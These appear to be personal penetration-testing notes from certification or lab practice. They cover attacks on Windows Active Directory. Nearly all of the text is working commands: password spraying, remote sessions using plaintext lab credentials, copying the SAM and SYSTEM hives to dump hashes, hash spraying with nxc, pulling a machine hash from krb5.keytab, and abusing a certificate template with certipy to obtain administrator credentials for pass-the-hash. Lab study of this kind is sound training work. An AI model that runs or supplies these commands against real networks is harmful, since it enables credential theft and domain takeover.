## DomainPasswordSpray.ps1
```powershell
Import-Module .\DomainPasswordSpray.ps1
```
```powershell
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

---
                                                                                                                           
PSSession script to to connect to another windows device in the internal network:
	`$User = "wario"`
	`$Password = ConvertTo-SecureString "Mushroom!" -AsPlainText -Force`
	`$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $Password`
	`$Session = New-PSSession -ComputerName client02.medtech.com -Credential $Credential`
	`Invoke-Command -Session $Session -ScriptBlock {`
	    `hostname }`

`winrs -r:http://prod01.medtech.com:5985 -u:leon -p:"rabbit:)" "cmd"`



Getting hashes from SAM/SYSTEM Files
	- C:\windows.old\Windows\System32\SAM
		- `download C:\windows.old\Windows\System32\SAM /home/daniel/OSCP_A/SAM`
			- evil-winrm command to download file to kali
			- make sure to include whole filepath with name of file 'SAM' at the end
	- C:\windows.old\Windows\System32\SYSTEM
		- `download C:\windows.old\Windows\System32\SYSTEM /home/daniel/OSCP_A/SYSTEM`
	- `secretsdump.py -sam SAM -system SYSTEM local`


`arp -a`


winrs

spray hashes:
`nxc winrm hosts.txt -u users.txt -H hashes.txt --continue-on-success`

search for domain certificates using certipy
```
certipy find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip 10.10.186.213 
```
- returns a bunch of info on the domain, can be put into bloodhound

if "Domain Computers" has Enrollment Rights and you have access to a domain-joined machine, search for the `krb5.keytab` file, usually stored at `/etc/krb5.keytab` on linux
- transfer to home machine and run:
```
python3 keytabextract.py krb5.keytab
```
- get the ntlm hash and use with certipy:
```
certipy req -u 'MAIL01$' -hashes ":0f916c5246fdbc7ba95dcef4126d57bd" -dc-ip "10.10.232.21" -ca 'hybrid-DC01-CA' -template 'HYBRIDCOMPUTERS' -upn 'administrator' -target 'dc01.hybrid.vl' -key-size 4096 -debug
```
- make sure IPs are listed in `/etc/hosts`
- `-template 'HYBRIDCOMPUTERS'` is from certipy.txt output file
- should save certificate and private key to administrator.pfx
```
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'hybrid.vl' -dc-ip 10.10.232.21
```
- get administrator hash to PTH with evil-winrm or whichever shell